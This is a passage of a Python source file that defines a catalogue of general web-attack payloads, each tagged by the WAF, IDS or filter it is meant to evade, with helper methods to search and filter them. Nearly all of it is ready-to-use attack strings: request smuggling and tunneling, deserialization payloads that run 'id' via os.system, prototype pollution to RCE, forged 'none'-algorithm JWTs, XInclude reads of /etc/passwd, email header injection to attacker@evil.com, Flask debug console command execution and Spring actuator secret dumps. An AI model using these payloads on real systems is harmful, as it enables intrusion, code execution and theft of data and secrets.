            'payload': 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n',
            'description': 'HTTP request smuggling TE.TE obfuscation',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Deserialization
        'general_java_deser_ysoserial': {
            'payload': 'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAoTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHA=',
            'description': 'Java deserialization ysoserial-format payload (base64)',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'general_php_deser': {
            'payload': 'O:8:"stdClass":1:{s:5:"admin";b:1;}',
            'description': 'PHP serialized object with admin flag',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_python_pickle': {
            'payload': "cos\nsystem\n(S'id'\ntR.",
            'description': 'Python pickle deserialization RCE',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'general_net_deser_viewstate': {
            'payload': '/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbA==',
            'description': '.NET ViewState deserialization template',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        # Prototype Pollution
        'general_proto_pollution_query': {
            'payload': '?__proto__[admin]=true',
            'description': 'Prototype pollution via query string',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_proto_pollution_body': {
            'payload': '__proto__[admin]=true',
            'description': 'Prototype pollution in POST body',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_proto_pollution_json': {
            'payload': '{"__proto__":{"admin":true,"role":"superadmin"}}',
            'description': 'Prototype pollution via JSON',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Business logic
        'general_negative_price': {
            'payload': '-1',
            'description': 'Negative value for business logic bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_integer_overflow': {
            'payload': '9999999999999999999',
            'description': 'Integer overflow input',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_negative_integer': {
            'payload': '-2147483648',
            'description': 'Minimum 32-bit integer overflow',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Format string
        'general_format_string': {
            'payload': '%s%s%s%s%s%s%s%s%s%s',
            'description': 'Format string vulnerability test',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_format_string_n': {
            'payload': '%n%n%n%n',
            'description': 'Format string %n write primitive',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Unicode normalization
        'general_unicode_normalization': {
            'payload': '\u0041\u0064\u006d\u0069\u006e',
            'description': 'Unicode normalization bypass (Admin)',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_unicode_lookalike': {
            'payload': '\u0061\u0064\u006d\u0131\u006e',
            'description': 'Unicode lookalike characters for filter bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # Email header injection
        'general_email_header_inject': {
            'payload': 'victim@target.com\r\nBcc: attacker@evil.com',
            'description': 'Email header injection via CRLF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Host header
        'general_host_override': {
            'payload': 'X-Host: evil.com',
            'description': 'Host override via X-Host header',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_forwarded_for_spoof': {
            'payload': 'X-Forwarded-For: 127.0.0.1',
            'description': 'IP spoofing via X-Forwarded-For',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_real_ip_spoof': {
            'payload': 'X-Real-IP: 127.0.0.1',
            'description': 'IP spoofing via X-Real-IP',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_client_ip_spoof': {
            'payload': 'Client-IP: 127.0.0.1',
            'description': 'IP spoofing via Client-IP header',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # WAF bypass techniques
        'general_chunked_encoding': {
            'payload': 'Transfer-Encoding: chunked',
            'description': 'Chunked transfer encoding to bypass length-based WAF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_content_type_mismatch': {
            'payload': 'Content-Type: application/x-www-form-urlencoded',
            'description': 'Content-Type mismatch for WAF bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # IDOR/UUID bruteforce patterns
        'general_idor_zero': {
            'payload': '0',
            'description': 'IDOR test with zero ID',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_idor_negative': {
            'payload': '-1',
            'description': 'IDOR test with negative ID',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_idor_float': {
            'payload': '1.0',
            'description': 'IDOR test with float ID',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        # Mass assignment
        'general_mass_assign_admin': {
            'payload': '{"role": "admin", "is_admin": true, "admin": 1}',
            'description': 'Mass assignment privilege escalation',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_mass_assign_verified': {
            'payload': '{"verified": true, "email_verified": true, "is_verified": 1}',
            'description': 'Mass assignment to bypass email verification',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # JWT manipulation
        'general_jwt_none_alg': {
            'payload': 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
            'description': 'JWT with algorithm set to none',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'general_jwt_rs256_to_hs256': {
            'payload': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.',
            'description': 'JWT RS256 to HS256 algorithm confusion',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        # GraphQL-related
        'general_graphql_depth_attack': {
            'payload': '{"query": "{user{friends{friends{friends{friends{friends{id}}}}}}}}"}',
            'description': 'GraphQL deeply nested query (DoS)',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'high'
        },
        'general_graphql_alias_overload': {
            'payload': '{"query": "{a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id}}"}',
            'description': 'GraphQL alias-based batching overload',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'medium'
        },
        # Zip bomb / decompression bomb
        'general_zip_bomb': {
            'payload': 'Content-Type: application/zip',
            'description': 'Zip bomb decompression attack header',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'medium'
        },
        # Special chars for various injection
        'general_null_byte_bypass': {
            'payload': '%00',
            'description': 'Null byte for filter/extension bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_unicode_rtl': {
            'payload': '\u202e',
            'description': 'Unicode right-to-left override character',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'general_long_string': {
            'payload': 'A' * 1024,
            'description': 'Long string for buffer overflow / WAF bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_sql_comment_waf': {
            'payload': '/*!50000 OR */1=1',
            'description': 'MySQL version-specific comment WAF bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # XML/HTML injection
        'general_xml_inject': {
            'payload': '"><test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></test>',
            'description': 'XInclude injection in XML field',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_html_inject': {
            'payload': '<h1>injected</h1>',
            'description': 'HTML injection test',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        # HTTP method override
        'general_method_override': {
            'payload': 'X-HTTP-Method-Override: DELETE',
            'description': 'HTTP method override to bypass firewall',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'medium'
        },
        'general_method_override_put': {
            'payload': '_method=PUT',
            'description': 'HTTP method override via POST parameter',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'medium'
        },
        # Rate limiting bypass
        'general_xff_spoof_127': {
            'payload': 'X-Forwarded-For: 127.0.0.1, 127.0.0.1',
            'description': 'X-Forwarded-For chained localhost bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_true_client_ip': {
            'payload': 'True-Client-IP: 127.0.0.1',
            'description': 'True-Client-IP header spoofing',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Content-type tricks
        'general_json_utf7': {
            'payload': 'Content-Type: application/json; charset=utf-7',
            'description': 'UTF-7 content-type to bypass XSS filters',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_multipart_bypass': {
            'payload': 'Content-Type: multipart/form-data; boundary=--boundary',
            'description': 'Multipart form to bypass JSON-only WAF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # Redirect bypass
        'general_open_redirect_unicode': {
            'payload': 'https:\u2215\u2215evil.com',
            'description': 'Open redirect via Unicode slash variants',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_open_redirect_triple_slash': {
            'payload': '///evil.com',
            'description': 'Open redirect via triple slash',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_open_redirect_encoded_colon': {
            'payload': 'https%3A%2F%2Fevil.com',
            'description': 'Open redirect via URL-encoded colon slash',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # CSRF
        'general_csrf_json': {
            'payload': '{"action": "delete", "target": "all_users"}',
            'description': 'CSRF payload as JSON body',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_csrf_img_tag': {
            'payload': '<img src="https://target.com/api/delete?id=1">',
            'description': 'CSRF via image tag GET request',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # WebSocket abuse
        'general_websocket_upgrade': {
            'payload': 'Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==',
            'description': 'WebSocket protocol upgrade for bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # HTTP/2 specific
        'general_h2c_upgrade': {
            'payload': 'Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__',
            'description': 'HTTP/2 cleartext upgrade for WAF bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Cache deception
        'general_cache_deception': {
            'payload': '/account/settings/test.css',
            'description': 'Web cache deception via static extension',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_cache_key_poison': {
            'payload': 'X-Cache-Key: /admin/',
            'description': 'Cache key poisoning via custom header',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # PHP type juggling
        'general_php_type_juggling': {
            'payload': '0e99999999999999',
            'description': 'PHP loose comparison hash bypass (magic hash)',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_php_magic_hash_md5': {
            'payload': '240610708',
            'description': 'PHP MD5 magic hash for type juggling',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Race condition
        'general_race_condition': {
            'payload': 'X-Race-Condition: parallel-request',
            'description': 'Race condition trigger header',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'high'
        },
        # Python object injection
        'general_python_yaml_deser': {
            'payload': '!!python/object/apply:os.system ["id"]',
            'description': 'Python YAML deserialization RCE',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'general_ruby_yaml_deser': {
            'payload': "--- !ruby/object:Gem::Requirement\nrequirements:\n  - - '>'\n    - !ruby/object:Gem::Version\n      version: 0.a\n",
            'description': 'Ruby YAML deserialization gadget',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        # Node.js injection
        'general_node_proto_pollution': {
            'payload': '__proto__[shell]=node&__proto__[env][NODE_OPTIONS]=--require /proc/self/environ&__proto__[env][PATH]=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
            'description': 'Node.js prototype pollution to RCE',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # DNS rebinding
        'general_dns_rebinding': {
            'payload': 'Host: rbndr.us',
            'description': 'DNS rebinding attack via rbndr.us',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Encoding tricks
        'general_double_url_encode': {
            'payload': '%2527',
            'description': 'Double URL encoded single quote',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_overlong_utf8': {
            'payload': '%c0%af',
            'description': 'Overlong UTF-8 encoding of forward slash',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # HTTP request tunneling
        'general_request_tunnel': {
            'payload': 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
            'description': 'HTTP request tunneling for access control bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Content negotiation
        'general_accept_all': {
            'payload': 'Accept: */*',
            'description': 'Accept all content types for bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'info'
        },
        'general_accept_html': {
            'payload': 'Accept: text/html,application/xhtml+xml',
            'description': 'HTML accept header for content negotiation bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        # Flask debug pin bypass
        'general_flask_debug': {
            'payload': '/console?__debugger__=yes&cmd=id&frm=0&s=debugsecret',
            'description': 'Flask debug console command injection',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Spring Boot actuator
        'general_spring_actuator': {
            'payload': '/actuator/env',
            'description': 'Spring Boot actuator environment endpoint',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'general_spring_heapdump': {
            'payload': '/actuator/heapdump',
            'description': 'Spring Boot heap dump for secret extraction',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Nginx misconfiguration
        'general_nginx_off_by_slash': {
            'payload': '/api../',
            'description': 'Nginx off-by-slash path traversal',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        }
    }

    @classmethod
    def get_all_payloads(cls) -> Dict[str, Dict]:
        """Get all payloads combined"""
        all_payloads = {}
        all_payloads.update(cls.XSS_PAYLOADS)
        all_payloads.update(cls.SQLI_PAYLOADS)
        all_payloads.update(cls.COMMAND_INJECTION_PAYLOADS)
        all_payloads.update(cls.PATH_TRAVERSAL_PAYLOADS)
        all_payloads.update(cls.XXE_PAYLOADS)
        all_payloads.update(cls.SSTI_PAYLOADS)
        all_payloads.update(cls.SSRF_PAYLOADS)
        all_payloads.update(cls.LDAP_PAYLOADS)
        all_payloads.update(cls.NOSQL_PAYLOADS)
        all_payloads.update(cls.GENERAL_PAYLOADS)
        return all_payloads

    @classmethod
    def get_by_category(cls, category: str) -> Dict[str, Dict]:
        """Get payloads by category"""
        all_payloads = cls.get_all_payloads()
        return {
            name: payload for name, payload in all_payloads.items()
            if payload['category'] == category
        }
    
    @classmethod
    def get_by_bypass_target(cls, target: str) -> Dict[str, Dict]:
        """Get payloads by bypass target"""
        all_payloads = cls.get_all_payloads()
        return {
            name: payload for name, payload in all_payloads.items()
            if payload['bypass_target'] == target or payload['bypass_target'] == BypassTarget.ALL
        }
    
    @classmethod
    def get_by_risk_level(cls, risk_level: str) -> Dict[str, Dict]:
        """Get payloads by risk level"""
        all_payloads = cls.get_all_payloads()
        return {
            name: payload for name, payload in all_payloads.items()
            if payload['risk_level'] == risk_level
        }
    
    @classmethod
    def get_payload(cls, payload_name: str) -> Optional[Dict]:
        """Get a specific payload by name"""
        all_payloads = cls.get_all_payloads()
        return all_payloads.get(payload_name)
    
    @classmethod
    def search_payloads(cls, search_term: str) -> Dict[str, Dict]:
        """Search payloads by name or description"""
        all_payloads = cls.get_all_payloads()
        search_term_lower = search_term.lower()
        return {
            name: payload for name, payload in all_payloads.items()
            if search_term_lower in name.lower() or search_term_lower in payload['description'].lower()
        }
